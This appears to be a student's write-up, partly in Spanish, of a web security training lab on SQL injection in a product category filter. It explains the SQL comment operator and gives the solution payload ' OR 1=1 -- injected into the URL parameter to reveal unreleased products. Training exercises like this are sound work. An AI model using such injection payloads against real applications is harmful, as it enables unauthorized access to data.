#Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
```
This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
```

```
Teoria:
En SQL existe el operador de comentario --.
Este operador permite ignorar todo el código que aparece después de él en la consulta.
Por ejemplo: SELECT * FROM products WHERE category = 'Gifts' -- comentario
Todo lo que esté después de -- no será ejecutado por la base de datos.
```

```
Resolución:
La aplicación tiene un filtro de productos por categoría mediante un parámetro en la URL:
/filter?category=Gifts

La aplicación genera una consulta SQL como SELECT * FROM products WHERE category = 'Gifts' AND released = 1
El campo released impide que se muestren productos no publicados.
Si modificamos el parámetro de la URL introduciendo una condición para que siempre sea verdadera:

' OR 1=1 --

La URL queda: /filter?category=Gifts' OR 1=1 --
```
